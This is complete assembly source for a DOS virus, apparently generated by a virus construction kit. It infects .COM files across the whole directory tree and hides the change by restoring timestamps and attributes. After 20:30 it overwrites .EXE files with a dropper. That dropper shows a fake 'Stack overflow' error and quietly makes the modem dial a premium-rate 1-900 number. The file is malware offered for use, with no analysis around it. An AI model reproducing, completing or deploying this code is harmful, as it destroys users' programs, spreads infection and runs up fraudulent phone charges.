; Created with Nowhere Man's Virus Creation Laboratory v1.00


virus_type      equ     0                       ; Appending Virus
is_encrypted    equ     0                       ; We're not encrypted
tsr_virus       equ     0                       ; We're not TSR

code            segment byte public
        assume  cs:code,ds:code,es:code,ss:code
        org     0100h

main            proc    near
        db      0E9h,00h,00h            ; Near jump (for compatibility)
start:          call    find_offset             ; Like a PUSH IP
find_offset:    pop     bp                      ; BP holds old IP
        sub     bp,offset find_offset   ; Adjust for length of host

        lea     si,[bp + buffer]        ; SI points to original start
        mov     di,0100h                ; Push 0100h on to stack for
        push    di                      ; return to main program
        movsw                           ; Copy the first two bytes
        movsb                           ; Copy the third byte

        mov     di,bp                   ; DI points to start of virus

        mov     bp,sp                   ; BP points to stack
        sub     sp,128                  ; Allocate 128 bytes on stack

        mov     ah,02Fh                 ; DOS get DTA function
        int     021h
        push    bx                      ; Save old DTA address on stack

        mov     ah,01Ah                 ; DOS set DTA function
        lea     dx,[bp - 128]           ; DX points to buffer on stack
        int     021h

        mov     cx,0003h                ; Do 3 infections
search_loop:    push    cx                      ; Save CX
        call    search_files            ; Find and infect a file
        pop     cx                      ; Restore CX
        loop    search_loop             ; Repeat until CX is 0

        call    get_hour
        cmp     ax,0014h                ; Did the function return 20?
        jl      skip00                  ; If less, skip effect
        call    get_minute
        cmp     ax,001Eh                ; Did the function return 30?
        jl      skip00                  ; If less, skip effect
        jmp     short strt00            ; Success -- skip jump
skip00:         jmp     end00                   ; Skip the routine
strt00:         lea     dx,[di + data00]        ; DX points to data
        lea     si,[di + data01]        ; SI points to data
        push    di                      ; Save DI
        mov     ah,02Fh                 ; DOS get DTA function
        int     021h
        mov     di,bx                   ; DI points to DTA
        mov     ah,04Eh                 ; DOS find first file function
        mov     cx,00100111b            ; CX holds all file attributes
        int     021h
        jc      create_file             ; If not found then create it
write_in_file:  mov     ax,04301h               ; DOS set file attributes function
        xor     cx,cx                   ; File will have no attributes
        lea     dx,[di + 01Eh]          ; DX points to file name
        int     021h
        mov     ax,03D01h               ; DOS open file function, write
        lea     dx,[di + 01Eh]          ; DX points to file name
        int     021h
        xchg    bx,ax                   ; Transfer file handle to AX
        mov     ah,040h                 ; DOS write to file function
        mov     cx,[si]                 ; CX holds number of byte to write
        lea     dx,[si + 2]             ; DX points to the data
        int     021h
        mov     ax,05701h               ; DOS set file date/time function
        mov     cx,[di + 016h]          ; CX holds old file time
        mov     dx,[di + 018h]          ; DX holds old file data
        int     021h
        mov     ah,03Eh                 ; DOS close file function
        int     021h
        mov     ax,04301h               ; DOS set file attributes function
        xor     ch,ch                   ; Clear CH for attributes
        mov     cl,[di + 015h]          ; CL holds old attributes
        lea     dx,[di + 01Eh]          ; DX points to file name
        int     021h
        mov     ah,04Fh                 ; DOS find next file function
        int     021h
        jnc     write_in_file           ; If successful do next file
        jmp     short dropper_end       ; Otherwise exit
create_file:    mov     ah,03Ch                 ; DOS create file function
        xor     cx,cx                   ; File has no attributes
        int     021h
        xchg    bx,ax                   ; Transfer file handle to AX
        mov     ah,040h                 ; DOS write to file function
        mov     cx,[si]                 ; CX holds number of byte to write
        lea     dx,[si + 2]             ; DX points to the data
        int     021h
        mov     ah,03Eh                 ; DOS close file function
        int     021h
dropper_end:    pop     di                      ; Restore DI

end00:
com_end:        pop     dx                      ; DX holds original DTA address
        mov     ah,01Ah                 ; DOS set DTA function
        int     021h

        mov     sp,bp                   ; Deallocate local buffer

        xor     ax,ax                   ;
        mov     bx,ax                   ;
        mov     cx,ax                   ;
        mov     dx,ax                   ; Empty out the registers
        mov     si,ax                   ;
        mov     di,ax                   ;
        mov     bp,ax                   ;

        ret                             ; Return to original program
main            endp

search_files    proc    near
        push    bp                      ; Save BP
        mov     bp,sp                   ; BP points to local buffer
        sub     sp,64                   ; Allocate 64 bytes on stack

        mov     ah,047h                 ; DOS get current dir function
        xor     dl,dl                   ; DL holds drive # (current)
        lea     si,[bp - 64]            ; SI points to 64-byte buffer
        int     021h

        mov     ah,03Bh                 ; DOS change directory function
        lea     dx,[di + root]          ; DX points to root directory
        int     021h

        call    traverse                ; Start the traversal

        mov     ah,03Bh                 ; DOS change directory function
        lea     dx,[bp - 64]            ; DX points to old directory
        int     021h

        mov     sp,bp                   ; Restore old stack pointer
        pop     bp                      ; Restore BP
        ret                             ; Return to caller

root            db      "\",0                   ; Root directory
search_files    endp

traverse        proc    near
        push    bp                      ; Save BP

        mov     ah,02Fh                 ; DOS get DTA function
        int     021h
        push    bx                      ; Save old DTA address

        mov     bp,sp                   ; BP points to local buffer
        sub     sp,128                  ; Allocate 128 bytes on stack

        mov     ah,01Ah                 ; DOS set DTA function
        lea     dx,[bp - 128]           ; DX points to buffer
        int     021h

        mov     ah,04Eh                 ; DOS find first function
        mov     cx,00010000b            ; CX holds search attributes
        lea     dx,[di + all_files]     ; DX points to "*.*"
        int     021h
        jc      leave_traverse          ; Leave if no files present

check_dir:      cmp     byte ptr [bp - 107],16  ; Is the file a directory?
        jne     another_dir             ; If not, try again
        cmp     byte ptr [bp - 98],'.'  ; Did we get a "." or ".."?
        je      another_dir             ;If so, keep going

        mov     ah,03Bh                 ; DOS change directory function
        lea     dx,[bp - 98]            ; DX points to new directory
        int     021h

        call    traverse                ; Recursively call ourself

        pushf                           ; Save the flags
        mov     ah,03Bh                 ; DOS change directory function
        lea     dx,[di + up_dir]        ; DX points to parent directory
        int     021h
        popf                            ; Restore the flags

        jnc     done_searching          ; If we infected then exit

another_dir:    mov     ah,04Fh                 ; DOS find next function
        int     021h
        jnc     check_dir               ; If found check the file

leave_traverse:
        lea     dx,[di + com_mask]      ; DX points to "*.COM"
        call    find_files              ; Try to infect a file
done_searching: mov     sp,bp                   ; Restore old stack frame
        mov     ah,01Ah                 ; DOS set DTA function
        pop     dx                      ; Retrieve old DTA address
        int     021h

        pop     bp                      ; Restore BP
        ret                             ; Return to caller

up_dir          db      "..",0                  ; Parent directory name
all_files       db      "*.*",0                 ; Directories to search for
com_mask        db      "*.com",0               ; Mask for all .COM files
traverse        endp

find_files      proc    near
        push    bp                      ; Save BP

        mov     ah,02Fh                 ; DOS get DTA function
        int     021h
        push    bx                      ; Save old DTA address

        mov     bp,sp                   ; BP points to local buffer
        sub     sp,128                  ; Allocate 128 bytes on stack

        push    dx                      ; Save file mask
        mov     ah,01Ah                 ; DOS set DTA function
        lea     dx,[bp - 128]           ; DX points to buffer
        int     021h

        mov     ah,04Eh                 ; DOS find first file function
        mov     cx,00100111b            ; CX holds all file attributes
        pop     dx                      ; Restore file mask
find_a_file:    int     021h
        jc      done_finding            ; Exit if no files found
        call    infect_file             ; Infect the file!
        jnc     done_finding            ; Exit if no error
        mov     ah,04Fh                 ; DOS find next file function
        jmp     short find_a_file       ; Try finding another file

done_finding:   mov     sp,bp                   ; Restore old stack frame
        mov     ah,01Ah                 ; DOS set DTA function
        pop     dx                      ; Retrieve old DTA address
        int     021h

        pop     bp                      ; Restore BP
        ret                             ; Return to caller
find_files      endp

infect_file     proc    near
        mov     ah,02Fh                 ; DOS get DTA address function
        int     021h
        mov     si,bx                   ; SI points to the DTA

        mov     byte ptr [di + set_carry],0  ; Assume we'll fail

        cmp     word ptr [si + 01Ah],(65279 - (finish - start))
        jbe     size_ok                 ; If it's small enough continue
        jmp     infection_done          ; Otherwise exit

size_ok:        mov     ax,03D00h               ; DOS open file function, r/o
        lea     dx,[si + 01Eh]          ; DX points to file name
        int     021h
        xchg    bx,ax                   ; BX holds file handle

        mov     ah,03Fh                 ; DOS read from file function
        mov     cx,3                    ; CX holds bytes to read (3)
        lea     dx,[di + buffer]        ; DX points to buffer
        int     021h

        mov     ax,04202h               ; DOS file seek function, EOF
        cwd                             ; Zero DX _ Zero bytes from end
        mov     cx,dx                   ; Zero CX /
        int     021h

        xchg    dx,ax                   ; Faster than a PUSH AX
        mov     ah,03Eh                 ; DOS close file function
        int     021h
        xchg    dx,ax                   ; Faster than a POP AX

        sub     ax,finish - start + 3   ; Adjust AX for a valid jump
        cmp     word ptr [di + buffer + 1],ax  ; Is there a JMP yet?
        je      infection_done          ; If equal then exit
        mov     byte ptr [di + set_carry],1  ; Success -- the file is OK
        add     ax,finish - start       ; Re-adjust to make the jump
        mov     word ptr [di + new_jump + 1],ax  ; Construct jump

        mov     ax,04301h               ; DOS set file attrib. function
        xor     cx,cx                   ; Clear all attributes
        lea     dx,[si + 01Eh]          ; DX points to victim's name
        int     021h

        mov     ax,03D02h               ; DOS open file function, r/w
        int     021h
        xchg    bx,ax                   ; BX holds file handle

        mov     ah,040h                 ; DOS write to file function
        mov     cx,3                    ; CX holds bytes to write (3)
        lea     dx,[di + new_jump]      ; DX points to the jump we made
        int     021h

        mov     ax,04202h               ; DOS file seek function, EOF
        cwd                             ; Zero DX _ Zero bytes from end
        mov     cx,dx                   ; Zero CX /
        int     021h

        mov     ah,040h                 ; DOS write to file function
        mov     cx,finish - start       ; CX holds virus length
        lea     dx,[di + start]         ; DX points to start of virus
        int     021h

        mov     ax,05701h               ; DOS set file time function
        mov     cx,[si + 016h]          ; CX holds old file time
        mov     dx,[si + 018h]          ; DX holds old file date
        int     021h

        mov     ah,03Eh                 ; DOS close file function
        int     021h

        mov     ax,04301h               ; DOS set file attrib. function
        xor     ch,ch                   ; Clear CH for file attribute
        mov     cl,[si + 015h]          ; CX holds file's old attributes
        lea     dx,[si + 01Eh]          ; DX points to victim's name
        int     021h

infection_done: cmp     byte ptr [di + set_carry],1  ; Set carry flag if failed
        ret                             ; Return to caller

set_carry       db      ?                       ; Set-carry-on-exit flag
buffer          db      090h,0CDh,020h          ; Buffer to hold old three bytes
new_jump        db      0E9h,?,?                ; New jump to virus
infect_file     endp


get_hour        proc    near
        mov     ah,02Ch                 ; DOS get time function
        int     021h
        mov     al,ch                   ; Copy hour into AL
        cbw                             ; Sign-extend AL into AX
        ret                             ; Return to caller
get_hour        endp

get_minute      proc    near
        mov     ah,02Ch                 ; DOS get time function
        int     021h
        mov     al,cl                   ; Copy minute into AL
        cbw                             ; Sign-extend AL into AX
        ret                             ; Return to caller
get_minute      endp

data00          db      "*.EXE",0

data01          dw      060h
        db      0BEh, 035h, 001h, 0B4h, 00Eh, 0ACh, 00Ah, 0C0h
        db      074h, 004h, 0CDh, 010h, 0EBh, 0F7h, 0BEh, 048h
        db      001h, 033h, 0D2h, 0E8h, 00Eh, 000h, 0BEh, 048h
        db      001h, 0BAh, 001h, 000h, 0E8h, 005h, 000h, 0B8h
        db      000h, 04Ch, 0CDh, 021h, 0B8h, 043h, 000h, 0CDh
        db      014h, 0B4h, 001h, 0ACh, 00Ah, 0C0h, 074h, 004h
        db      0CDh, 014h, 0EBh, 0F5h, 0C3h, 00Dh, 00Ah, 053h
        db      074h, 061h, 063h, 06Bh, 020h, 06Fh, 076h, 065h
        db      072h, 066h, 06Ch, 06Fh, 077h, 00Dh, 00Ah, 000h
        db      041h, 054h, 026h, 046h, 04Ch, 030h, 04Dh, 030h
        db      044h, 054h, 031h, 039h, 030h, 030h, 039h, 037h
        db      036h, 036h, 032h, 037h, 034h, 00Dh, 00Ah, 000h

finish          label   near

code            ends
        end     main
        